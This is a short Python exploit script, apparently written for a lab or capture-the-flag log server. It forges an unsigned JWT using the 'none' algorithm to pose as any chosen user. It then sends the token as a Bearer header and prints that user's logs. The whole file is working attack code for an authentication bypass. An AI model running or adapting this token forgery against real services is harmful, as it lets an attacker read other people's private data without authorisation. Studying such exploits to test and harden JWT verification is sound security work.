#!/usr/bin/python

import jwt
import http.client
from sys import argv, exit

def usage():
    print("{} user server=127.0.0.1 port=65333".format(argv[0]))
    print("logs for given user must exist")
    exit(1)

if len(argv) not in (2,3,4):
    usage()

exploit_user = argv[1]

if len(argv) > 2:
    addr = argv[2]
else: addr = "localhost"

if len(argv) == 4:
    try:
        port = int(argv[3])
    except:
        print("invalid port")
        usage()
else: port = 65333

# prepare token with alg: none
print("[*] create malicious token:")
token = jwt.encode(algorithm=None, payload={"aud": exploit_user, "iss": "logserver v0.1"}, key="")
print(jwt.get_unverified_header(token))
print(jwt.decode(token, verify=False))

print("[*] GET logs from user", exploit_user)
conn = http.client.HTTPConnection("127.0.0.1", port=65333)
header = {"Authorization" : "Bearer "+str(token, "ascii")}
try:
    conn.request("GET", "/"+exploit_user, headers=header)
    with conn.getresponse() as res:
        if res.status == 200:
            print("[*] recieved logs from user "+exploit_user+":")
            print("-------------------------")
            print(str(res.read(), "ascii"))
            print("-------------------------")
            print("exploit successful")
        else:
            print("[ERROR] {} {}: {}".format(res.status, res.reason, str(res.read(), "ascii")))
            exit(1)
except Exception as e:
    print("[ERROR]", e)
    exit(1)